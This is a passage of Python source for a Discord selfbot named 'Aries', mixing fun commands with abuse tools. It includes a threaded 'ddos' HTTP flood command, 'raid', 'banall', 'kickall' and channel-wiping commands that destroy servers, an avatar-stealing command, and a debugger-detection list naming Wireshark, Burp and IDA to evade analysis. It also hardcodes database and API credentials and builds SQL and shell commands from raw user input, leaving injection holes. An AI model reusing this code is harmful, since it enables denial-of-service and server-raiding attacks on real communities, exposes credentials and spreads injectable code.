async def convertvideo(ctx, videolink):
    await ctx.message.delete()
    def convert(path):
        yt = YouTube(videolink)
        yt = yt.streams.filter(progressive=True, file_extension='mp4').order_by('resolution').desc().first()
        if not os.path.exists(path):
            os.makedirs(path)
        yt.download(path)

    convert(str(os.getcwd()) + "/youtubeconverter")

    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= config.get('title'), description = f"Downloaded Video: {videolink} as mp4 to where Aries is!", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def iq(ctx, user: discord.User):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:

    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= config.get('title'), description = f"{user}'s IQ is: {random.randrange(1, 100)}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def insult(ctx, user: discord.User):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:

    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    insults = ["Light travels faster than sound, which is why you seemed bright until you spoke.", "You have so many gaps in your teeth it looks like your tongue is in jail.", "Hold still. I’m trying to imagine you with a personality.", "Don’t be ashamed of who you are. That’s your parents’ job.", "You are the human version of period cramps.", "If you’re going to be two-faced, at least make one of them pretty.", "You are like a cloud. When you disappear, it’s a beautiful day.", "OH MY GOD! IT SPEAKS!", "You just might be why the middle finger was invented in the first place.", "I guess if you actually ever spoke your mind, you’d really be speechless."]
    embed = discord.Embed(title= config.get('title'), description = f"{user} {random.choice(insults)}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def whois(ctx, website):
     await ctx.message.delete()
     ipv4 = socket.gethostbyname(f'{website}')
     obj = IPWhois(f'{ipv4}')
     objstring = str(obj.lookup_whois())
     with open(f"./data/themes/{theme_2}.json") as f:
        config = json.load(f)
        color = config.get('color')
        sixteenIntegerHex = int(color.replace("#", ""), 16)
        readableHex = int(hex(sixteenIntegerHex), 0)
        embed = discord.Embed(title= config.get('title'), description = f"{objstring}", color=readableHex)
        embed.set_thumbnail(url = config.get('imageurl'))
        embed.set_footer(text = "made with ♡ by bomt")
        await ctx.send(embed = embed)
@bot.command()
async def question(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:

    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    eightballs = ["for sure!", "yeah", "yes", "ok", "no", "i wouldnt advise", "ask agian", ""]
    embed = discord.Embed(title= config.get('title'), description = f"{random.choice(eightballs)}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def servericon(ctx):
    icon_url = ctx.guild.icon_url
    with open(f"./data/themes/{theme_2}.json") as f:
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= config.get('title'), description = f"Server Icon", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_image(url = f"{icon_url}")
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def banrecord(ctx):
    await ctx.message.delete()
    bans = await ctx.guild.bans()
    loop = [f"{u[1]} ({u[1].id})" for u in bans]
    _list = "\r\n".join([f"[{str(num).zfill(2)}] {data}" for num, data in enumerate(loop, start=1)])
    with open("./data/bans.json", "w") as f:
        f.write(json.dumps(f'{_list}', indent=2))
@bot.command()
async def listbans(ctx, *, reason=None):
    bans = await ctx.guild.bans()
    loop = [f"{u[1]} ({u[1].id})" for u in bans]
    _list = "\r\n".join([f"[{str(num).zfill(2)}] {data}" for num, data in enumerate(loop, start=1)])
    await ctx.send(f"```ini\n{_list}```")
@bot.command()
async def banall(ctx, *, reason=None):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f: 
     config = json.load(f)
    color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    try:
      members = ctx.guild.members
      members.remove(ctx.me)
      for member in members:
       await member.ban(reason = reason)
    except Exception as e:
     print(e)
@bot.command()
async def kickall(ctx, *, reason=None):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f: 
     config = json.load(f)
    color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    try:
      members = ctx.guild.members
      members.remove(ctx.me)
      for member in members:
       await member.kick(reason = reason)
    except Exception as e:
     print(e)
@bot.command()
async def register(ctx, Username, Password):
    cnx = mysql.connect(user='epiz_30428895', password='2QT1FBqfzI8g1y',
                              host='sql310.epizy.com',
                              database='epiz_30428895_db_school',
                              use_pure=False)
    mySql_insert_query = f"""INSERT INTO tb_student (Username, Password) 
                           VALUES 
                           ({Username}, {Password}) """

    cursor = mysql.cursor()
    cursor.execute(mySql_insert_query)
    mysql.commit()
    print(cursor.rowcount, "Record inserted successfully into Laptop table")
    cursor.close()
    cnx.close()
@bot.command()
async def cls(ctx, *, reason=None):
    await ctx.message.delete()
    os.system('cls' if os.name == 'nt' else 'clear')
    print("Cleared!")
    await asyncio.sleep(5)
    global nitro_sniper
    global build
    global prefix
    global copier
    global selfbot_detector
    os.system('cls' if os.name == 'nt' else 'clear')
    global ctu
    print(f"{ctu}                                                   ___         _          ")
    print(f"{ctu}                                                  /   |  _____(_)__  _____")
    print(f"{ctu}                                                 / /| | / ___/ / _ \/ ___/")
    print(f"{ctu}                                                / ___ |/ /  / /  __(__  ) ")
    print(f"{ctu}                                               /_/  |_/_/  /_/\___/____/  ")
    print(Fore.RESET + "\n\n                                             Ram the opposition with Aries")
    print("\n" + Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + commandamt + Fore.RESET + "Commands!")
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "User Is In » " + Fore.LIGHTCYAN_EX + str(len(bot.guilds))  + Fore.RESET + " Guilds!")
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Build » " + Fore.LIGHTCYAN_EX + build + Fore.RESET)
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Prefix » " + Fore.LIGHTCYAN_EX + str(prefix) + Fore.RESET)
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Sniper » " + Fore.LIGHTCYAN_EX + str(nitro_sniper) + Fore.RESET)
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Selfbot Detector » " + Fore.LIGHTCYAN_EX + str(selfbot_detector) + Fore.RESET)
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Copycat » " + Fore.LIGHTCYAN_EX + str(copier) + Fore.RESET)
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[+]" + Fore.GREEN + " Connected! Enjoy Aries " + Fore.RESET + f"{bot.user}" + Fore.RESET)     
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[+]" + Fore.BLUE + " (Please Note that your token is safe and is only stored in a json file) " + Fore.RESET)   
@bot.command()
async def grabsiteip(ctx, website):    
    websiteip = socket.gethostbyname(f'{website}')
    config = json.load(f)
    color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= "Aries SiteIP Grabber", description = f"IP: {websiteip}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)    
@bot.command()
async def ddos(ctx, threads, target):
    fake_ip = '182.21.20.32'
    port = 80
    bytes = random._urandom(1490)
    def attack():
     while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + bytes + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
            s.close()
        except Exception:
            pass
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:

    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    for i in range(int(threads)):
        thread = threading.Thread(target=attack)
        thread.start()
    embed = discord.Embed(title= "Aries DDoS Attack", description = f"DDoSing: + {target}".encode('ascii'), color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)    
@bot.command()
async def support(ctx):
    channel = bot.get_channel(911101764185493557)
    try:
        message = await channel.send('!new') 
        await message.delete()
    except Exception:
        with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
            config = json.load(f)
        color = config.get('color')
        sixteenIntegerHex = int(color.replace("#", ""), 16)
        readableHex = int(hex(sixteenIntegerHex), 0)
        embed = discord.Embed(title= "Aries Support", description = f"Error | You aren't in Aries Server - https://discord.gg/eaGRnxZj7r", color=readableHex)
        embed.set_thumbnail(url = config.get('imageurl'))
        embed.set_footer(text = "made with ♡ by bomt")
        await ctx.send(embed = embed)
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= "Aries Support", description = f"Contacted Aries Support In the Aries Server. Check your ticket in Aries!", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def pingweb(ctx, website):
    try:
        websiteip = socket.gethostbyname(f'{website}')
        msg = None
        pingit = "-n 1"
        status = os.popen("ping " + pingit + " " + websiteip).read()
        if "TTL" in status: 
            msg = f"Website: {website} is UP"
        else:
            msg = f"Website: {website} is DOWN"
    except Exception as e:
        msg = f"Website: {website} is DOWN"
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= "Aries Pinger", description = f"Pinging: + {website}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")

    embed1 = discord.Embed(title= "Aries Pinger", description = f"{msg}", color=readableHex)
    embed1.set_thumbnail(url = config.get('imageurl'))
    embed1.set_footer(text = "made with ♡ by bomt")

    msg1 = await ctx.send(embed = embed) 
    sleep(1)
    await msg1.edit(embed = embed1)
@bot.command()
async def pingip(ctx, ip):
    msg = None
    pingit = "-n 1"
    status = os.popen("ping " + pingit + " " + ip).read()
    if "TTL" in status: 
        msg = f"IP: {ip} is UP"
    else:
        msg = f"IP: {ip} is DOWN"

    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= "Aries Pinger", description = f"Pinging: + {ip}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")

    embed1 = discord.Embed(title= "Aries Pinger", description = f"{msg}", color=readableHex)
    embed1.set_thumbnail(url = config.get('imageurl'))
    embed1.set_footer(text = "made with ♡ by bomt")

    msg1 = await ctx.send(embed = embed) 
    sleep(1)
    await msg1.edit(embed = embed1)
@bot.command()
async def afk(ctx, args):
    await ctx.message.delete()
    global afkmode
    args1 = str(args)
    args2 = args1.replace("t", "T")
    data = {
        "token": f"{token}",
        "prefix": f"{prefix}",
        "sniper": f"{nitro_sniper}",
        "detector": f"{selfbot_detector}",
        "theme": f"{theme_2}",
        "AFK": f"{args2}",
        "AFK-Message": f"{afkmsg}",
        "Fake-Nitro": f"{fake_nitro}"
    }
    with open(f"./data/config.json", "w") as f:
        f.write(json.dumps(data, indent=4))
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= "Aries AFK Mode", description = f"Set AFK To: + {afkmode}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed) 
    os.execl(sys.executable, sys.executable, "\"{}\"".format(sys.argv[0]))
@bot.command()
async def unban(ctx, id: int):
    user = await bot.fetch_user(id)
    await ctx.guild.unban(user)
    with open(f"./data/themes/{theme_2}.json") as f:
     config = json.load(f)
    color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= "Aries AFK Mode", description = f"Unbanned: {user}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def iplookup(ctx, ip):
    #Ip Info using ipapi
    info = ipapi.location(ip=ip)    
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
     config = json.load(f)
    color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= "Aries IPLookup Mode", description = f"Country: {info['country_name']}\nCity: {info['city']}\nTimezone: {info['timezone']}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def delchannels(ctx):
    for c in ctx.guild.channels: # iterating through each guild channel
        await c.delete()
@bot.command()
async def createchannels(ctx):
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    try:
      guild = ctx.guild
	  #channel = await guild.create_text_channel(channel_name)
      for i in range(70):
       await guild.create_text_channel("Aries on TOP")
      embed = discord.Embed(title=config.get('title'), description = "Created " + "Successfully", color=readableHex)    
      embed.set_thumbnail(url = config.get('imageurl'))
      await ctx.send(embed = embed) 
    except commands.MissingPermissions:
     embed = discord.Embed(title=config.get('title'), description = "Error | Insufficient Perms!", color=readableHex)    
     embed.set_thumbnail(url = config.get('imageurl'))
     await ctx.send(embed = embed) 
@bot.command()
async def changelog(ctx):
    global ctu
    print(f"""
            {Fore.GREEN}Green = Added
            {Fore.YELLOW}Yellow = Fixed
            {Fore.RED}Red = Removed {Fore.RESET}
{ctu}------------------------------------------------------------------------------------------------------------------------

            {Fore.GREEN}Commands »                                      {Fore.GREEN}Features »                                      {Fore.GREEN}GUI »
            
            Added Changelog Command                         New(er) NitroSniper                             New(er) GUI
            Added Polls                                     AFK Mode                                        New Settings GUI
            Added Spamreaction                              Selfbot Detector                                New Exit Buttons
            Added CPU Command                                                                               Fixed GUI Loading Bugs
            Added IPLookup                                  
            {Fore.YELLOW}                                   
                                                            Fixed Login Time Bugs
                                                            Fixed GUI Bugs
            Fixed All Help/Info Menus                       Fixed Nitro Sniper Timing
            Fixed 12 Commands                               Fixed Nitro Sniper Auto-Redeem
            Fixed StealPFP and Avatar
    
    
    
    """)
@bot.command()
async def ecb64(ctx, *, text):
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    #Store Message to Encode 
    message = text
    #Convert to Bytes like Object using Strings encode method
    message_bytes = message.encode('ascii')
    #Encode using base64
    base64_bytes = base64.b64encode(message_bytes)
    #Make it a String
    base64_message = base64_bytes.decode('ascii')
    embed = discord.Embed(title=config.get('title'), description = f"Decoded: {text}\nEncoded: {base64_message}", color=readableHex)    
    embed.set_thumbnail(url = config.get('imageurl'))
    await ctx.send(embed = embed) 

@bot.command()
async def dcb64(ctx, text):
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    base64_message = text
    #Make it a bytes like object
    base64_bytes = base64_message.encode('ascii')
    #Decoode base64 Bytes
    message_bytes = base64.b64decode(base64_bytes)
    #Decode into String object
    message = message_bytes.decode('ascii')
    #Send it
    embed = discord.Embed(title=config.get('title'), description = f"Encoded: {text}\nDecoded: {message}", color=readableHex)    
    embed.set_thumbnail(url = config.get('imageurl'))
    await ctx.send(embed = embed) 
@bot.command()
async def serveremojis(ctx):
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    for emoji in ctx.guild.emojis:
        embed = discord.Embed(title=config.get('title'), description = f"This Server Has: {emoji.name}", color=readableHex)    
        embed.set_thumbnail(url = config.get('imageurl'))
        await ctx.send(embed = embed) 
@bot.command()
async def codeblock(ctx, mode, *, text):
    #TODO Add more
    if ("Normal" in mode):
        await ctx.send(f'```{text}```')
    elif "Java" in mode:
        text = f'```java\n{text}\n```'
        await ctx.send(text)
    elif "css" in mode:
        text = f'```css\n{text}\n```'
        await ctx.send(text)
@bot.command()
async def ascii(ctx, *, text):
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    #`
    asciiart = text2art(text)
    await ctx.send(f'```{asciiart}```')
@bot.command()
async def stealpfp(ctx, user: discord.User = None):
    isdone = False
    #Saves Avatar
    await user.avatar_url_as(format="png").save(fp=f"ariespfpgrabber.png")
    #Gets the path to where it saves the Avatar
    pfp_path = str(os.getcwd() + "/ariespfpgrabber.png")
    #Opens Image
    fp = open(pfp_path, 'rb')
    #Reads it
    pfp = fp.read()
    #Tries to set it
    try:
     await bot.user.edit(avatar = pfp) 
     isdone = True
     #Catches any Exceptions found
    except Exception:
     #If found print error
     print("Error Setting PFP")
     pass
     #Delete
     if isdone == True:
      try:
       os.remove((str(os.getcwd() + "/ariespfpgrabber.png")))
       isdone == False
      #Catches deleting Exception
      except Exception:
        print("Error")
        pass
@bot.command()
async def checkban(ctx, uuid, banid):
    await ctx.message.delete()
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
        "XF-Api-Key": "bjtcSJf7RBLifkPVxFtexqAQOvpxOUE9"
    }
    resp = requests.get(f"https://hypixel.net/api/players/{uuid}/ban/{banid}", headers=headers)
    respstr = str(resp.text)
    print(respstr)
    print("--------------------------Overall--------------------------")
    if ("Ban" or "ban" in respstr):
        print(f"{Fore.RED}Banned = Yes")
    if ("Cheating through the use of unfair game advantages." in respstr):
        print(f"{Fore.RED}Staff Ban = Yes")
    with open(f"./data/themes/{theme_2}.json") as f:
     config = json.load(f)
    color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title=config.get('title'), description = f"{respstr}", color=readableHex)    
    embed.set_thumbnail(url = config.get('imageurl')) 
    await ctx.send(embed = embed) 
    #print(resp.text)
@bot.command()
async def cpu(ctx):
    #Get Amount of Used CPU
    cpu1 = round(psutil.cpu_percent(),1)
    #Loads the json to read contents
    with open(f"./data/themes/{theme_2}.json") as f:
     config = json.load(f)
    color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title=config.get('title'), description = f"CPU Info: {platform.processor()}\nCPU Usage: {cpu1}", color=readableHex)    
    embed.set_thumbnail(url = config.get('imageurl')) 
    await ctx.send(embed = embed) 
@bot.command()
async def friendslist(ctx):
    for user in bot.user.friends:    
         num = int(0.8)
         sleep(num)    
         print(user.name + f"#{user.discriminator}")
    msg_to_del = await ctx.send('Check Console / GUI!')
    sleep(5)
    await msg_to_del.delete()
    sleep(30)
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.CYAN + "                                                  ___         _          ")
    print(Fore.CYAN + "                                                 /   |  _____(_)__  _____")
    print(Fore.CYAN + "                                                / /| | / ___/ / _ \/ ___/")
    print(Fore.CYAN + "                                               / ___ |/ /  / /  __(__  ) ")
    print(Fore.CYAN + "                                              /_/  |_/_/  /_/\___/____/  ")
    print(Fore.RESET + "\n\n                                             Ram the opposition with Aries")
    print("\n" + Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + commandamt + Fore.RESET + "Commands!")
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "User Is In » " + Fore.LIGHTCYAN_EX + str(len(bot.guilds))  + Fore.RESET + " Guilds!")
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Build » " + Fore.LIGHTCYAN_EX + build + Fore.RESET)
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Prefix » " + Fore.LIGHTCYAN_EX + str(prefix) + Fore.RESET)
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Sniper » " + Fore.LIGHTCYAN_EX + str(nitro_sniper) + Fore.RESET)
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Selfbot Detector » " + Fore.LIGHTCYAN_EX + str(selfbot_detector) + Fore.RESET)
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Copycat » " + Fore.LIGHTCYAN_EX + str(copier) + Fore.RESET)
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[+]" + Fore.GREEN + " Connected! Enjoy Aries " + Fore.RESET + f"{bot.user}" + Fore.RESET)     
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[+]" + Fore.BLUE + " (Please Note that your token is safe and is only stored in a json file) " + Fore.RESET)
@bot.command()
async def raid(ctx):
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    try:
     for c in ctx.guild.channels:
        await c.delete()
    except commands.MissingPermissions:
        print("No Permission To RAID")

    try:
        guild = ctx.guild
        for i in range(70):
         await guild.create_text_channel("Aries on TOP")
        members = ctx.guild.members
        members.remove(ctx.me)
        for member in members:
         await member.kick(reason = "RAIDED")
        print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[+] " + "Successfully Raided " + Fore.RESET + f"{ctx.guild}!")
        sleep(5)
        ctx.guild.leave
    except commands.MissingPermissions:
        print("No Permission To RAID")
try:
#Runs Bot
     invalidProc = [ "taskmgr.exe", "httpdebuggersvc.exe", "httpdebuggerui.exe", "burpsuitecommunity.exe", "burpsuite.exe", "java bytecode editor.exe", "classeditor.exe", "fiddler everywhere.exe", "scylla_x64.exe", "megadumper.exe", "cheat engine.exe", "cheatengine.exe", "cheatengine.exe", "javassist.exe","processhacker.exe", "nemesis.exe", "ida.exe", "ida64.exe", "ollydbg.exe", "x64dbg.exe", "x32dbg.exe", "ksdumperdriver.sys.exe","ksdumper.exe", "dumper.exe", "codecracker.exe", "charles.exe", "dnspy.exe", "simpleassembly.exe", "peek.exe", "httpanalyzer.exe","httpdebug.exe", "fiddler.exe", "wireshark.exe", "dbx.exe", "mdbg.exe", "gdb.exe", "windbg.exe", "dbgclr.exe", "kdb.exe", "kgdb.exe", "mdb.exe","scylla_x86.exe", "scylla.exe", "idau64.exe", "http debugger.exe", "idaq.exe", "idaq64.exe", "idaw.exe", "idaw64.exe", "idag.exe", "recaf.exe","idag64.exe", "importrec.exe", "immunitydebugger.exe", "codebrowser.exe", "reshacker.exe", "hxd.exe", "reflector.exe", "process hacker.exe"]
     def debuggerCheck():
        for proc in psutil.process_iter():
                processName = proc.name()
                processID = proc.pid
                if processName.lower() in invalidProc:
                    print("Error, Debugger Found!")
                    sleep(60000)
     def runbot():
        try:
         bot.run(token)
        except Exception:
            #Skips any Exceptions found
            pass
        #Print error if an error is found.
        print("Error logging into provided token! If you belive this is a mistake contact staff")
     t1 = threading.Thread(target=runbot)
     t2 = threading.Thread(target=runGUI)
     t3 = threading.Thread(target=debuggerCheck())

     ISDIR5 = os.path.isdir("./data/beta")  
     #Check if THeres a beta folder but no beta file to ask for a license
     if betarelease == True and os.path.exists("./data/beta/license.json"):
        skip = True
     elif betarelease == True and not skip:
         license = input("License: ")
        # validate(license, getHWID())
     if betarelease == True and skip:
        with open("./data/beta/license.json") as f:
            config = json.load(f)
            autoUseLicense = config.get('License')
        #validate(autoUseLicense, getHWID())
     if betarelease == True and ISDIR5 and not os.path.exists("./data/beta/license.json"):
         licensey = input("License: ")
        # validate(licensey, getHWID())
     if betarelease == False and ISDIR5 and not os.path.exists("./data/beta/license.json"):
         licensey = input("License: ")
         #For Beta Releases  
        # validate(licensey, getHWID())

     #Check if an already existing Aries user is using a beta version and make them input their key         
     if (betarelease == True and not ISDIR5 and not os.path.exists("./data/beta/license.json")):
         licensey = input("License: ")
         #For Beta Releases  
         #validate(licensey, getHWID())
     
     # starting thread 1
     t1.start()
     # starting thread 2
    # t2.start()

     t3.start()
     # wait until thread 1 is completely executed
     t1.join()
     # wait until thread 2 is completely executed
    # t2.join()
     t3.join()
#Catch Error | For try statement
except Exception as e:
    pass
    print(e)